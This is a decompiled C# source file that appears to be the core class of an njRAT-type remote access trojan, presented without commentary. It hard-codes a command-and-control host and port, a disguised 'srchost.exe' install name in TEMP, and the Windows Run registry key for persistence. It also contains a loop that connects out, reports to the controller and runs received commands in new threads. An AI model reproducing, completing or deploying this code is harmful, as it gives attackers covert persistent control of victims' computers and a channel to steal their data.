using System;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using ns1;
using ns2;
using ns5;
using ns6;

namespace ns0;

internal class Class0
{
	public string string_0;

	public string string_1;

	public string string_2;

	public Mutex mutex_0;

	public string string_3;

	public string string_4;

	public string string_5;

	public string string_6;

	public string string_7;

	public bool bool_0;

	public string string_8;

	public bool bool_1;

	public Class2 class2_0;

	public string string_9;

	public Class1 class1_0;

	public object object_0;

	internal object object_1;

	public bool bool_2;

	public object object_2;

	internal string string_10;

	public object object_3;

	public Class0()
	{
		//IL_0257: Unknown result type (might be due to invalid IL or missing references)
		//IL_0261: Expected O, but got Unknown
		string_0 = "SGFjS2Vk";
		string_1 = new string(new char[6] { '0', '.', '5', '.', '0', 'E' });
		string_2 = "";
		mutex_0 = null;
		string_3 = "srchost.exe";
		string_4 = "TEMP";
		string_5 = "66ab680999f0962f8e115084d372036c";
		string_6 = "honorman.linkpc.net";
		string_7 = "1177";
		bool_0 = Conversions.ToBoolean("True");
		string_8 = new string(new char[5] { '|', '\'', '|', '\'', '|' });
		bool_1 = Conversions.ToBoolean("True");
		class2_0 = new Class2();
		string_9 = new string(new char[7] { '[', 'e', 'n', 'd', 'o', 'f', ']' });
		class1_0 = null;
		object_0 = new FileInfo(Application.get_ExecutablePath());
		bool_2 = false;
		object_2 = null;
		string_10 = new string(new char[45]
		{
			'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '\\', 'M',
			'i', 'c', 'r', 'o', 's', 'o', 'f', 't', '\\', 'W',
			'i', 'n', 'd', 'o', 'w', 's', '\\', 'C', 'u', 'r',
			'r', 'e', 'n', 't', 'V', 'e', 'r', 's', 'i', 'o',
			'n', '\\', 'R', 'u', 'n'
		});
		object_3 = (object)new Computer();
	}

	[STAThread]
	public static void Main()
	{
		if (Class37.smethod_0())
		{
			Class0 class0_ = new Class0();
			Class24.smethod_87(class0_);
		}
	}

	internal void method_0(object object_4, object object_5)
	{
		try
		{
			string text = new string(new char[2] { 'r', 's' });
			string text2 = string_8;
			string text3 = Conversions.ToString(NewLateBinding.LateGet(object_5, (Type)null, "Data", new object[0], (string[])null, (Type[])null, (bool[])null));
			string text4 = Class24.smethod_134(this, ref text3);
			NewLateBinding.LateSetComplex(object_5, (Type)null, "Data", new object[1] { text3 }, (string[])null, (Type[])null, true, false);
			Class24.smethod_102(this, text + text2 + text4);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public unsafe void method_1()
	{
		void* ptr = stackalloc byte[12];
		object obj = new MemoryStream();
		*(int*)ptr = 0;
		while (true)
		{
			try
			{
				if (object_2 != null && !Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(object_2, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Connected", new object[0], (string[])null, (Type[])null, (bool[])null), (object)false, false) && bool_2)
				{
					checked
					{
						(*unchecked((int*)ptr))++;
					}
					if (*(int*)ptr <= 500)
					{
						goto IL_0110;
					}
					*(int*)ptr = 0;
					if (!Conversions.ToBoolean(Operators.AndObject(NewLateBinding.LateGet(NewLateBinding.LateGet(object_2, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Poll", new object[2]
					{
						-1,
						SelectMode.SelectRead
					}, (string[])null, (Type[])null, (bool[])null), Operators.CompareObjectLessEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(object_2, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Available", new object[0], (string[])null, (Type[])null, (bool[])null), (object)0, false))))
					{
						goto IL_0110;
					}
				}
				goto end_IL_000f;
				IL_0110:
				if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(object_2, (Type)null, "Available", new object[0], (string[])null, (Type[])null, (bool[])null), (object)0, false))
				{
					byte[] array = new byte[checked(Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet(object_2, (Type)null, "Available", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1)) + 1)];
					object obj2 = NewLateBinding.LateGet(object_2, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null);
					object[] array2 = new object[4]
					{
						array,
						0,
						array.Length,
						SocketFlags.None
					};
					object[] array3 = array2;
					bool[] array4 = new bool[4] { true, false, false, false };
					NewLateBinding.LateCall(obj2, (Type)null, "Receive", array3, (string[])null, (Type[])null, array4, true);
					if (array4[0])
					{
						array = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(byte[]));
					}
					object obj3 = obj;
					object[] array5 = new object[3] { array, 0, array.Length };
					object[] array6 = array5;
					array4 = new bool[3] { true, false, false };
					NewLateBinding.LateCall(obj3, (Type)null, "Write", array6, (string[])null, (Type[])null, array4, true);
					if (array4[0])
					{
						array = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
					}
					while (true)
					{
						object obj4 = obj;
						byte[] byte_ = (byte[])NewLateBinding.LateGet(obj4, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null);
						string text = Class24.smethod_32(this, ref byte_);
						NewLateBinding.LateSetComplex(obj4, (Type)null, "ToArray", new object[1] { byte_ }, (string[])null, (Type[])null, true, false);
						if (text.Contains(string_9))
						{
							byte[] byte_2 = (byte[])NewLateBinding.LateGet(obj, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null);
							string text2 = string_9;
							Array array7 = Class24.smethod_176(text2, this, byte_2);
							Thread thread = new Thread(method_4);
							thread.Start(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array7, new object[1] { 0 }, (string[])null)));
							NewLateBinding.LateCall(obj, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
							obj = new MemoryStream();
							if (array7.Length == 2)
							{
								object obj5 = obj;
								object[] array8 = new object[3];
								array5 = new object[1];
								object[] array9 = array5;
								*(int*)((byte*)ptr + 4) = 1;
								array9[0] = *(int*)((byte*)ptr + 4);
								array8[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array7, array5, (string[])null));
								array8[1] = 0;
								object[] array10 = new object[1];
								array2 = array10;
								object[] array11 = array2;
								*(int*)((byte*)ptr + 8) = 0;
								int num = *(int*)((byte*)ptr + 8);
								obj4 = 1;
								array11[num] = RuntimeHelpers.GetObjectValue(obj4);
								object[] array12 = array2;
								string[] array13 = null;
								array8[2] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateIndexGet((object)array7, array12, array13), (Type)null, "length", new object[0], (string[])null, (Type[])null, (bool[])null));
								object[] array14 = array8;
								array4 = new bool[3] { true, false, true };
								NewLateBinding.LateCall(obj5, (Type)null, "Write", array14, (string[])null, (Type[])null, array4, true);
								if (array4[0])
								{
									NewLateBinding.LateIndexSetComplex((object)array7, new object[2]
									{
										*(int*)((byte*)ptr + 4),
										RuntimeHelpers.GetObjectValue(array14[0])
									}, (string[])null, true, false);
								}
								if (array4[2])
								{
									array2 = array10;
									array2[*(int*)((byte*)ptr + 8)] = RuntimeHelpers.GetObjectValue(obj4);
									NewLateBinding.LateSetComplex(NewLateBinding.LateIndexGet((object)array7, array12, array13), (Type)null, "length", new object[1] { RuntimeHelpers.GetObjectValue(array14[2]) }, (string[])null, (Type[])null, true, true);
								}
								continue;
							}
							break;
						}
						break;
					}
				}
				goto IL_07e3;
				end_IL_000f:;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
			while (true)
			{
				bool_2 = false;
				try
				{
					NewLateBinding.LateCall(NewLateBinding.LateGet(object_2, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Disconnect", new object[1] { false }, (string[])null, (Type[])null, (bool[])null, true);
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception ex4 = ex3;
					ProjectData.ClearProjectError();
				}
				try
				{
					NewLateBinding.LateCall(obj, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				}
				catch (Exception ex5)
				{
					ProjectData.SetProjectError(ex5);
					Exception ex6 = ex5;
					ProjectData.ClearProjectError();
				}
				obj = new MemoryStream();
				try
				{
					NewLateBinding.LateCall(object_1, (Type)null, "Kill", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					object_1 = null;
				}
				catch (Exception ex7)
				{
					ProjectData.SetProjectError(ex7);
					Exception ex8 = ex7;
					ProjectData.ClearProjectError();
				}
				try
				{
					object_2 = new TcpClient();
					NewLateBinding.LateSet(object_2, (Type)null, "ReceiveTimeout", new object[1] { -1 }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(object_2, (Type)null, "SendTimeout", new object[1] { -1 }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(object_2, (Type)null, "SendBufferSize", new object[1] { 999999 }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(object_2, (Type)null, "ReceiveBufferSize", new object[1] { 999999 }, (string[])null, (Type[])null);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_2, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "SendBufferSize", new object[1] { 999999 }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_2, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ReceiveBufferSize", new object[1] { 999999 }, (string[])null, (Type[])null, false, true);
					*(int*)ptr = 0;
					object obj6 = NewLateBinding.LateGet(object_2, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null);
					object[] array15 = new object[2] { string_6, string_7 };
					object[] array16 = array15;
					bool[] array4 = new bool[2] { true, true };
					NewLateBinding.LateCall(obj6, (Type)null, "Connect", array16, (string[])null, (Type[])null, array4, true);
					if (array4[0])
					{
						string_6 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[0]), typeof(string));
					}
					if (array4[1])
					{
						string_7 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[1]), typeof(string));
					}
					bool_2 = true;
					Class24.smethod_102(this, Class24.smethod_20(this));
					try
					{
						if (Operators.CompareString(Class24.smethod_162(this, "us"), "!", false) == 0)
						{
							Class24.smethod_102(this, new string(new char[2] { 'u', 's' }));
						}
					}
					catch (Exception ex9)
					{
						ProjectData.SetProjectError(ex9);
						Exception ex10 = ex9;
						bool_2 = false;
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception ex11)
				{
					ProjectData.SetProjectError(ex11);
					Exception ex12 = ex11;
					Thread.Sleep(2500);
					ProjectData.ClearProjectError();
					continue;
				}
				break;
			}
			continue;
			IL_07e3:
			Thread.Sleep(1);
		}
	}

	[SpecialName]
	internal void method_2(object sender, SessionEndingEventArgs e)
	{
		Class24.smethod_147(this);
	}

	[SpecialName]
	internal void method_3(object sender, EventArgs e)
	{
		Class24.smethod_6(this);
	}

	[SpecialName]
	private void method_4(object object_4)
	{
		Class24.smethod_127((byte[])object_4, this);
	}
}
